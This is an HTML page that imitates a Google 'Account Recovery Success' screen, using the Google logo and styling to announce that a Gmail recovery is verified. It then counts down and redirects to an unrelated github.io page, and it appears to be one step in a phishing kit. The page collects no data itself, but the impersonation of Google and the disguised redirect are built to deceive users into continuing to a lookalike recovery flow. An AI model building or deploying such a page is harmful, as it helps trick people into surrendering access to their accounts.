<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Account Recovery Success</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
    
    <style>
        /* =========================================
           GOOGLE OFFICIAL LIGHT THEME STYLES
           ========================================= */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #f0f4f9; /* Google Background Color */
            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #202124;
            overflow: hidden;
        }

        /* --- MAIN CARD --- */
        #main-container {
            background-color: #ffffff;
            padding: 40px 40px;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
            width: 100%;
            max-width: 420px;
            box-sizing: border-box;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            
            /* Smooth Google-style fade in */
            animation: fadeInCard 0.6s cubic-bezier(0.4, 0, 0.2, 1) forwards;
        }

        @keyframes fadeInCard {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* --- GOOGLE LOGO --- */
        .logo-container {
            margin-bottom: 20px;
        }

        .logo-container img {
            height: 32px; 
        }

        /* --- SUCCESS TICK ICON --- */
        .success-circle {
            width: 64px;
            height: 64px;
            background-color: #e6f4ea; /* Light Green Background */
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) 0.2s both;
        }

        .success-circle svg {
            width: 32px;
            height: 32px;
            fill: #0f9d58; /* Google Official Green */
        }

        @keyframes popIn {
            0% { transform: scale(0); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }

        /* --- TEXT STYLES --- */
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin: 0 0 10px 0;
        }

        p.info-text {
            font-size: 16px;
            color: #5f6368;
            margin: 0 0 25px 0;
            line-height: 1.5;
        }

        /* --- STATIC TIMER STYLES (No Blinking, Clear Drop Shadow) --- */
        .timer-wrapper {
            margin-top: 5px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #timer {
            font-size: 45px; 
            font-weight: 900;
            color: #0f9d58; /* Solid, strong Google Green */
            
            /* Clean black drop shadow for depth + slight green shadow for premium feel */
            text-shadow: 2px 4px 6px rgba(0, 0, 0, 0.2), 0 0 12px rgba(15, 157, 88, 0.35);
            
            min-width: 50px;
            line-height: 1;
            /* Blinking animation hata di gayi hai */
        }

        /* --- LOADING OVERLAY --- */
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            /* 60% white background so the card behind is still visible */
            background: rgba(255, 255, 255, 0.6); 
            /* Blur effect for the background (dhundhla karne ke liye) */
            backdrop-filter: blur(8px); 
            -webkit-backdrop-filter: blur(8px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 999;
        }

        #loading-image {
            width: 80px; 
            animation: pulseGif 1s infinite alternate;
        }

        @keyframes pulseGif {
            0% { opacity: 0.6; transform: scale(0.95); }
            100% { opacity: 1; transform: scale(1.05); }
        }

        /* --- MOBILE RESPONSIVE --- */
        @media (max-width: 480px) {
            #main-container { 
                padding: 30px 25px; 
                margin: 15px;
                border-radius: 12px;
            }
            h1 { font-size: 22px; }
            p.info-text { font-size: 15px; }
            #timer { font-size: 40px; }
        }
    </style>
</head>
<body>

    <div id="main-container">
        
        <div class="logo-container">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>

        <div class="success-circle">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
            </svg>
        </div>

        <h1>Congratulations</h1>
        
        <p class="info-text">
            Gmail Account recovery is verified.<br>
            Preparing to proceed to the next step.
        </p>

        <div class="timer-wrapper">
            <span id="timer">10</span>
        </div>

    </div>

    <div id="loading-overlay">
        <img id="loading-image" src="gml.gif" alt="Loading...">
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const timerSpan = document.getElementById('timer');
            const loadingOverlay = document.getElementById('loading-overlay');
            
            let timeLeft = 10;

            // Timer starts immediately
            const countdownInterval = setInterval(() => {
                timeLeft--;
                timerSpan.textContent = timeLeft;

                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    startLoadingSequence();
                }
            }, 1000);

            function startLoadingSequence() {
                // Show transparent blurred loading screen over the existing page
                loadingOverlay.style.display = 'flex';

                // Wait 3 seconds then redirect
                setTimeout(() => {
                    // Your exact original redirect link
                    window.location.href = "https://gmlunlok.github.io/recovery/congratulations/mee/pass";
                }, 3000);
            }
        });
    </script>

</body>
</html>
